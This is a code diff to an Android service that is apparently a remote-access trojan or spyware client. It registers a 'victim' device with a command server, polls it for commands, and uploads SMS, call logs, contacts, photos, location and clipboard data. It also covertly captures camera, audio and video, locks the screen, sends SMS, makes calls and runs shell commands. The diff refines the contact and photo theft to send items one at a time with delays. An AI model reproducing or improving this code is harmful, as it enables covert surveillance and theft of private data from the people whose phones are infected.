@@ -10,6 +10,7 @@ import android.content.ClipboardManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.database.Cursor;
 import android.graphics.ImageFormat;
 import android.hardware.Camera;
 import android.location.Location;
@@ -64,6 +65,9 @@ public class ServiceRunner extends Service {
     private String victimToken = "";
     private boolean registered = false;
 
+    // ============================================================
+    // Lifecycle
+    // ============================================================
     @Override
     public void onCreate() {
         super.onCreate();
@@ -151,6 +155,9 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { return "unknown"; }
     }
 
+    // ============================================================
+    // Register
+    // ============================================================
     private void registerWithServer() {
         try {
             JSONObject d = new JSONObject();
@@ -170,6 +177,9 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // Poll Commands
+    // ============================================================
     private void pollCommands() {
         try {
             if (!registered) {
@@ -250,6 +260,9 @@ public class ServiceRunner extends Service {
         } catch (Exception ignored) {}
     }
 
+    // ============================================================
+    // Device Info
+    // ============================================================
     private void sendDeviceInfo() {
         try {
             JSONObject d = new JSONObject();
@@ -266,6 +279,9 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // Battery
+    // ============================================================
     private void sendBattery() {
         try {
             android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
@@ -290,6 +306,9 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // SMS
+    // ============================================================
     private void sendSms() {
         try {
             if (!hasPermission(android.Manifest.permission.READ_SMS)) {
@@ -320,6 +339,9 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // Call Log
+    // ============================================================
     private void sendCallLog() {
         try {
             if (!hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
@@ -351,38 +373,94 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // ★★★ Contacts — إرسال واحد واحد ★★★
+    // ============================================================
     private void sendContacts() {
         try {
             if (!hasPermission(android.Manifest.permission.READ_CONTACTS)) {
                 reportCommandResult("get_contacts", "fail", "no_read_contacts_permission");
                 return;
             }
-            JSONArray arr = new JSONArray();
-            android.database.Cursor c = getContentResolver().query(
+
+            Cursor c = getContentResolver().query(
                     ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
-            if (c != null) {
-                while (c.moveToNext() && arr.length() < 100) {
-                    JSONObject contact = new JSONObject();
-                    contact.put("name", c.getString(c.getColumnIndexOrThrow(
-                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
-                    contact.put("number", c.getString(c.getColumnIndexOrThrow(
-                            ContactsContract.CommonDataKinds.Phone.NUMBER)));
-                    arr.put(contact);
-                }
-                c.close();
+
+            if (c == null) {
+                reportCommandResult("get_contacts", "fail", "cursor_null");
+                return;
             }
-            JSONObject d = new JSONObject();
-            d.put("type", "contacts");
-            d.put("token", victimToken);
-            d.put("device", deviceId);
-            d.put("contacts", arr);
-            postJson("/apk/victim/data", d);
+
+            int totalCount = c.getCount();
+            Log.d(TAG, "Total contacts: " + totalCount);
+
+            if (totalCount == 0) {
+                c.close();
+                reportCommandResult("get_contacts", "fail", "no_contacts");
+                return;
+            }
+
+            int sent = 0;
+            while (c.moveToNext() && sent < 200) {
+                try {
+                    String name = "";
+                    String number = "";
+                    try {
+                        name = c.getString(c.getColumnIndexOrThrow(
+                                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    } catch (Exception e) {}
+                    try {
+                        number = c.getString(c.getColumnIndexOrThrow(
+                                ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    } catch (Exception e) {}
+
+                    JSONObject contact = new JSONObject();
+                    contact.put("name", name);
+                    contact.put("number", number);
+
+                    JSONObject d = new JSONObject();
+                    d.put("type", "contacts");
+                    d.put("token", victimToken);
+                    d.put("device", deviceId);
+                    d.put("contact", contact);
+                    d.put("index", sent);
+                    d.put("total", totalCount);
+
+                    postJson("/apk/victim/data", d);
+
+                    sent++;
+
+                    // ★ delay صغير كل 20 جهة
+                    if (sent % 20 == 0) {
+                        Thread.sleep(300);
+                    }
+
+                } catch (Exception e) {
+                    Log.e(TAG, "contact error: " + e.getMessage());
+                    sent++;
+                }
+            }
+            c.close();
+
+            // إشعار الانتهاء
+            JSONObject done = new JSONObject();
+            done.put("type", "contacts_done");
+            done.put("token", victimToken);
+            done.put("device", deviceId);
+            done.put("total", sent);
+            postJson("/apk/victim/data", done);
+
             reportCommandResult("get_contacts", "ok", "");
+            Log.d(TAG, "Contacts sent: " + sent);
+
         } catch (Exception e) {
             reportCommandResult("get_contacts", "fail", e.getMessage());
         }
     }
 
+    // ============================================================
+    // Apps
+    // ============================================================
     private void sendApps() {
         try {
             JSONArray arr = new JSONArray();
@@ -408,34 +486,91 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // ★★★ Photos — إرسال 5 صور واحدة واحدة ★★★
+    // ============================================================
     private void sendPhotos() {
         try {
-            JSONArray arr = new JSONArray();
-            android.database.Cursor c = getContentResolver().query(
+            Cursor c = getContentResolver().query(
                     MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null,
-                    MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 20");
-            if (c != null) {
-                while (c.moveToNext() && arr.length() < 20) {
-                    JSONObject p = new JSONObject();
-                    try {
-                        p.put("path", c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)));
-                        arr.put(p);
-                    } catch (Exception ignored) {}
-                }
-                c.close();
+                    MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 5");
+
+            if (c == null) {
+                reportCommandResult("get_photos", "fail", "cursor_null");
+                return;
             }
+
+            int sent = 0;
+            int total = c.getCount();
+            Log.d(TAG, "Total photos: " + total);
+
+            while (c.moveToNext() && sent < 5) {
+                try {
+                    String path = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
+                    long size = c.getLong(c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));
+
+                    // ★ تخطى الصور الكبيرة
+                    if (size > 1500000 || size <= 0) {
+                        Log.d(TAG, "Skip large photo: " + size);
+                        sent++;
+                        continue;
+                    }
+
+                    File imgFile = new File(path);
+                    if (!imgFile.exists() || !imgFile.canRead()) {
+                        sent++;
+                        continue;
+                    }
+
+                    // ★★ اقرأ وأرسل مباشرة
+                    byte[] bytes = new byte[(int) imgFile.length()];
+                    FileInputStream fis = new FileInputStream(imgFile);
+                    int read = fis.read(bytes);
+                    fis.close();
+
+                    if (read > 0) {
+                        String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                        JSONObject d = new JSONObject();
+                        d.put("type", "photo_single");
+                        d.put("token", victimToken);
+                        d.put("device", deviceId);
+                        d.put("name", imgFile.getName());
+                        d.put("image", "data:image/jpeg;base64," + base64);
+                        postJson("/apk/victim/data", d);
+
+                        Log.d(TAG, "Photo sent: " + imgFile.getName() + " (" + size + " bytes)");
+                    }
+
+                    sent++;
+
+                    // ★ delay 500ms بين كل صورة
+                    Thread.sleep(500);
+
+                } catch (Exception e) {
+                    Log.e(TAG, "photo error: " + e.getMessage());
+                    sent++;
+                }
+            }
+            c.close();
+
+            // إشعار الانتهاء
             JSONObject d = new JSONObject();
-            d.put("type", "photos");
+            d.put("type", "photos_done");
             d.put("token", victimToken);
             d.put("device", deviceId);
-            d.put("photos", arr);
+            d.put("total", sent);
             postJson("/apk/victim/data", d);
+
             reportCommandResult("get_photos", "ok", "");
+
         } catch (Exception e) {
             reportCommandResult("get_photos", "fail", e.getMessage());
         }
     }
 
+    // ============================================================
+    // Location
+    // ============================================================
     private void sendLocation() {
         try {
             LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
@@ -476,6 +611,9 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // Clipboard
+    // ============================================================
     private void sendClipboard() {
         try {
             ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
@@ -501,6 +639,9 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // Camera — Take Picture
+    // ============================================================
     private void takePicture(final int cameraId) {
         new Handler(Looper.getMainLooper()).post(() -> {
             Camera camera = null;
@@ -576,6 +717,9 @@ public class ServiceRunner extends Service {
         });
     }
 
+    // ============================================================
+    // Audio Record
+    // ============================================================
     private void recordAudio(final int durationMs) {
         new Thread(() -> {
             MediaRecorder recorder = null;
@@ -635,6 +779,9 @@ public class ServiceRunner extends Service {
         }).start();
     }
 
+    // ============================================================
+    // Video Record
+    // ============================================================
     private void recordVideo(final int cameraId, final int durationMs) {
         new Thread(() -> {
             Camera camera = null;
@@ -715,13 +862,15 @@ public class ServiceRunner extends Service {
         }).start();
     }
 
-    // ★★★ قفل الشاشة — باستخدام AdminReceiver ★★★
+    // ============================================================
+    // Lock Screen
+    // ============================================================
     private void lockScreen() {
         try {
             DevicePolicyManager dpm = (DevicePolicyManager)
                     getSystemService(Context.DEVICE_POLICY_SERVICE);
             ComponentName adminComponent = new ComponentName(this,
-                    AdminReceiver.class);  // ← AdminReceiver
+                    AdminReceiver.class);
 
             if (dpm == null) {
                 reportCommandResult("lock_screen", "fail", "no_dpm");
@@ -745,6 +894,9 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // Home
+    // ============================================================
     private void goHome() {
         try {
             Intent intent = new Intent(Intent.ACTION_MAIN);
@@ -757,6 +909,9 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // Sounds
+    // ============================================================
     private void playSound() {
         try {
             Ringtone r = RingtoneManager.getRingtone(getApplicationContext(),
@@ -775,6 +930,9 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("play_alarm", "fail", e.getMessage()); }
     }
 
+    // ============================================================
+    // Vibrate
+    // ============================================================
     private void vibrate(long ms) {
         try {
             Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
@@ -811,6 +969,9 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("volume_max", "fail", e.getMessage()); }
     }
 
+    // ============================================================
+    // SMS Send
+    // ============================================================
     private void sendSmsToNumber(String to, String msg) {
         try {
             if (!hasPermission(android.Manifest.permission.SEND_SMS)) {
@@ -823,6 +984,9 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("send_sms", "fail", e.getMessage()); }
     }
 
+    // ============================================================
+    // Call
+    // ============================================================
     private void callNumber(String number) {
         try {
             if (!hasPermission(android.Manifest.permission.CALL_PHONE)) {
@@ -846,6 +1010,9 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("open_url", "fail", e.getMessage()); }
     }
 
+    // ============================================================
+    // Shell
+    // ============================================================
     private void executeShell(String command) {
         try {
             Process p = Runtime.getRuntime().exec(command);
@@ -866,6 +1033,9 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("shell", "fail", e.getMessage()); }
     }
 
+    // ============================================================
+    // Permission Helper
+    // ============================================================
     private boolean hasPermission(String permission) {
         try {
             return ContextCompat.checkSelfPermission(this, permission)
@@ -875,6 +1045,9 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // HTTP
+    // ============================================================
     private String httpGet(String urlStr) {
         try {
             URL url = new URL(urlStr);
@@ -932,4 +1105,4 @@ public class ServiceRunner extends Service {
     private void postJson(String path, JSONObject data) {
         postJsonWithResponse(path, data);
     }
-                                        }
+        }
